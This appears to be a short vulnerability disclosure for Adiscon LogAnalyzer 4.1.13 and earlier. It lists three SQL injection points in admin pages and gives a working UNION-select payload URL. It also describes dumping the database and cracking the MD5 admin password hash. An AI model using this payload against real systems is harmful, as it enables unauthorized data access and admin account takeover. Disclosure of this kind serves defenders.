# Adiscon
2023-34600

[Vendor of Product]
Adiscon
------------------------------------------ 
[Affected Product Code Base]
Adiscon LogAnalyzer - V4.1.13(latest) and before
------------------------------------------

Screen:
![image](https://github.com/costacoco/Adiscon/assets/48556345/58aa7a9e-932d-42a0-a1ad-9aec887f209f)

We found three SQL Injection point
/admin/searches.php (need Read-only user or admin)
/admin/users.php (need admin)
/admin/groups.php (need admin)

screen of SQL injection
http://{ip}/loganalyzer/admin/searches.php?op=edit&id=-8%20union%20all%20select%201,user(),@@version,4,5--
![image](https://github.com/costacoco/Adiscon/assets/48556345/930ac46a-e88f-4366-8ee9-54a2a9d95bbc)

screen of db dump
![image](https://github.com/costacoco/Adiscon/assets/48556345/98862081-ff0c-4a2e-87d9-87b18afa6228)
![image](https://github.com/costacoco/Adiscon/assets/48556345/e94afe1b-4e2d-4d72-81b2-d37d39f7ba55)
![image](https://github.com/costacoco/Adiscon/assets/48556345/facf564a-ff4a-498d-91f8-83e494d0428e)

Because it used basic md5 hash, so we can try to dehash it

screen of dehash
![image](https://github.com/costacoco/Adiscon/assets/48556345/5f8e3296-8bb5-4088-bedf-9a20b4af0760)

Then, we got the admin  password


[Reference]
https://loganalyzer.adiscon.com/

------------------------------------------

